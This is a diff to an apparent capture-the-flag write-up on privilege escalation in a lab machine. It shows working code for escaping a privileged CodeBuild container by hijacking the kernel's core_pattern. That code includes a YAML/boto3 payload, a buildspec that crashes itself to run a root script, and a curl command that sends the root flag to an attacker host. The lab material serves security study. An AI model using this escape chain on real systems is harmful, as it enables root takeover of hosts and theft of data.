@@ -218,23 +218,202 @@ This confirmed that the worker continuously trusted and executed user-controlled
 
 ## Privilege Escalation
 
-After validating the worker's behaviour and understanding the application's architecture, I used a custom automation script to reproduce the complete attack chain.
+Attempts to communicate directly with the local LocalStack instance (`floci`) using the previously acquired IAM temporary credentials from the host shell consistently resulted in `403 AccessDenied` responses.
 
-The script requires only the attacker's callback IP address and automatically performs the remaining stages of the exploitation process:
+This demonstrated that although the compromised `nimbus-worker` and `nimbus-web` IAM roles were heavily restricted, the internal `worker.py` daemon processed queued jobs using an unthrottled administrative context. Instead of interacting with LocalStack directly, the attack was therefore performed by submitting a malicious job to the application's asynchronous processing queue.
 
-```bash
-python3 nimbus_exploit.py <ATTACKER_IP> --port <LOCAL_PORT> --target <TARGET_IP>
+---
+
+## Exploitation Theory
+
+Linux handles process crashes (segmentation faults) according to the value stored in:
+
+```text
+/proc/sys/kernel/core_pattern
 ```
 
-- Retrieves fresh IAM credentials through the SSRF vulnerability.
-- Authenticates to the LocalStack AWS environment.
-- Generates a malicious YAML payload.
-- Submits the payload to the `nimbus-jobs` SQS queue.
-- Starts an HTTP callback listener.
-- Triggers a privileged CodeBuild container.
-- Exploits the host's `core_pattern` mechanism.
-- Retrieves both the user and root flags.
+When `core_pattern` begins with the pipe (`|`) character, the kernel interprets the remaining string as an executable and launches it as **root** whenever a process crashes.
 
-Within a few seconds, the worker processed the queued payload, the privileged build completed successfully, and the callback listener received the contents of both `user.txt` and `root.txt`, demonstrating a fully automated compromise from initial SSRF to root access.
+Since the LocalStack deployment exposed the AWS CodeBuild service, it was possible to instruct the privileged backend worker to create and execute a new CodeBuild project using the local image:
 
-![Exploit Output](images/Image8.png)
+```text
+floci/floci:latest
+```
+
+with:
+
+```text
+privilegedMode = true
+```
+
+A privileged container shares the host kernel, allowing writes to host kernel interfaces such as `/proc/sys/kernel/core_pattern`.
+
+By dynamically determining its OverlayFS storage path from:
+
+```text
+/proc/self/mountinfo
+```
+
+the build container could locate its corresponding host filesystem (`upperdir`) and configure the kernel to execute a malicious script stored inside the container workspace.
+
+When the build process intentionally crashed, the host kernel executed this script as **root**, resulting in container escape and host code execution.
+
+---
+
+# Crafting the Exploit
+
+To automate the attack, the entire CodeBuild project creation, execution, and kernel hijacking logic was embedded inside a Python script.
+
+This script was wrapped inside a YAML payload that would later be submitted to the vulnerable `worker.py` daemon through the SQS queue.
+
+The payload (`escape.yaml`) is shown below.
+
+```yaml
+name: escape-via-queue
+
+script: |
+    import boto3
+
+    buildspec = r"""version: 0.2
+    phases:
+      build:
+        commands:
+          - id || true
+          - UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1) || true
+          - printf '#!/bin/sh\ncat /root/root.txt > %s/rootflag.txt\nchmod 777 %s/rootflag.txt\n' "$UDIR" "$UDIR" > /exploit_root.sh || true
+          - chmod +x /exploit_root.sh || true
+          - echo "|${UDIR}/exploit_root.sh" > /proc/sys/kernel/core_pattern || true
+          - ulimit -c unlimited || true
+          - bash -c 'kill -11 $$' || true
+          - sleep 2 || true
+          - curl -sf -X POST http://<ATTACKER_IP>:<PORT>/root \
+              -d "flag=$(cat /rootflag.txt 2>/dev/null | base64 -w0 || echo NOTFOUND)" \
+              --max-time 10 || true
+    """
+
+    cb = boto3.client(
+        "codebuild",
+        region_name="us-east-1",
+        endpoint_url="http://floci:4566",
+        aws_access_key_id="test",
+        aws_secret_access_key="test"
+    )
+
+    try:
+        cb.create_project(
+            name="nimbus-exploit",
+            source={"type": "NO_SOURCE"},
+            artifacts={"type": "NO_ARTIFACTS"},
+            environment={
+                "type": "LINUX_CONTAINER",
+                "computeType": "BUILD_GENERAL1_SMALL",
+                "image": "floci/floci:latest",
+                "privilegedMode": True
+            },
+            serviceRole="arn:aws:iam::000000000000:role/codebuild-role"
+        )
+    except Exception:
+        pass
+
+    cb.start_build(
+        projectName="nimbus-exploit",
+        environmentVariablesOverride=[
+            {
+                "name": "BASH_FUNC_id%%",
+                "value": "() { echo uid=1000; }",
+                "type": "PLAINTEXT"
+            }
+        ],
+        buildspecOverride=buildspec
+    )
+```
+
+---
+
+# Preparing the Listener
+
+A listener was started to receive the exfiltrated root flag from the host after successful exploitation.
+
+For example:
+
+```bash
+nc -lvnp <PORT>
+```
+
+or alternatively using a simple HTTP server capable of handling POST requests.
+
+---
+
+# Sending the Payload
+
+The malicious YAML payload was injected into the application's asynchronous job queue using the local AWS CLI.
+
+```bash
+aws --endpoint-url http://aws.nimbus.htb sqs send-message \
+  --queue-url "http://floci:4566/847219365028/nimbus-jobs" \
+  --message-body "$(cat escape.yaml)"
+```
+
+---
+
+# Execution Flow
+
+Once the vulnerable `worker.py` daemon processed the queued message, the following chain of events occurred:
+
+1. The worker executed the embedded Python script with its privileged LocalStack permissions.
+
+2. A new CodeBuild project named `nimbus-exploit` was created.
+
+3. The project launched a privileged container using the `floci/floci:latest` image.
+
+4. The build process parsed `/proc/self/mountinfo` to determine its OverlayFS `upperdir` on the host filesystem.
+
+5. A malicious script (`exploit_root.sh`) was written into the container filesystem, which was simultaneously accessible from the host through the OverlayFS storage directory.
+
+6. The build modified the host kernel configuration by setting:
+
+   ```text
+   /proc/sys/kernel/core_pattern
+   ```
+
+   to:
+
+   ```text
+   |<upperdir>/exploit_root.sh
+   ```
+
+7. The build intentionally crashed itself using:
+
+   ```bash
+   kill -11 $$
+   ```
+
+8. The host kernel intercepted the segmentation fault and executed the malicious script as **root**.
+
+9. The script copied the contents of:
+
+   ```text
+   /root/root.txt
+   ```
+
+   into the shared OverlayFS directory.
+
+10. Finally, the build container read the flag, Base64-encoded it, and exfiltrated it back to the attacker's listener.
+
+![Captured Flag](images/Image8.png)
+
+# Retrieving the Root Flag
+
+The exfiltrated flag was received by the listener in Base64 format and decoded locally.
+
+```bash
+echo "<BASE64_STRING>" | base64 -d
+```
+
+The decoded output contained the contents of:
+
+```text
+/root/root.txt
+```
+
+confirming successful container escape and arbitrary code execution on the host as the **root** user.
